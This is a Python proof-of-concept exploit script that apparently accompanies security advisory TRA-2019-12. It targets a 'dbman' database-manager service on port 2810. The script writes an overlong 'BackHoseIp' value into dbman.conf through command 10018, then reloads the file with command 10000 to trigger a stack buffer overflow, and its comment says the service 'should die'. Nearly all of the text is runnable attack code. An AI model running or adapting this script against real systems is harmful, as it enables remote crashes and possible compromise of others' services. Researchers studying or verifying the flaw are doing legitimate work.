# https://www.tenable.com/security/research/tra-2019-12
import sys, socket, string
from struct import *
from pyasn1.type import univ
from pyasn1.codec.ber import encoder
import hexdump

def usage():
  print "usage  : "+sys.argv[0] + " <target_host>  [target_port]"
  print "example: "+sys.argv[0] + " 192.168.1.123 2810"

def mk_msg(cmd, data):
  msg = pack(">LL", cmd, len(data))  
  msg += data  
  return msg

def send_cmd(s, cmd, data):
  req = mk_msg(cmd, data)
  print "Command %d request:" % (cmd)
  print hexdump.hexdump(req)
    
  s.send(req)
  res = s.recv(1024)
  print "Command %d response:" % (cmd)
  print hexdump.hexdump(res)
  
if len(sys.argv) != 2 and len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])

if len(sys.argv) == 3:
  port = int(sys.argv[2])
else:
  port = 2810

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

# Command 10018 (hostRoleSwitch)
seq = univ.Sequence()
seq.setComponentByPosition(0, univ.Integer(1))    # Role
seq.setComponentByPosition(1, univ.Integer(0xff)) # BackupTime?
# BackHoseIp
# Each line in dbman.conf must be < 0x400 or subsequent
# lines will not be processed
BackHoseIp = 'A' * (0x3ff - len('BackHoseIp = '))
 
seq.setComponentByPosition(2, univ.OctetString(BackHoseIp)) 
data_10018 = encoder.encode(seq) 

# Set long BackHoseIp in dbman.conf 
send_cmd(s, 10018, data_10018)
s.close()

# Reconnect and reload dbman.conf via command 10000 (SendBakConfigFileReq)
# a long BackHoseIp will cause a stack buffer overflow
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))
# dbman should die
send_cmd(s, 10000, '')
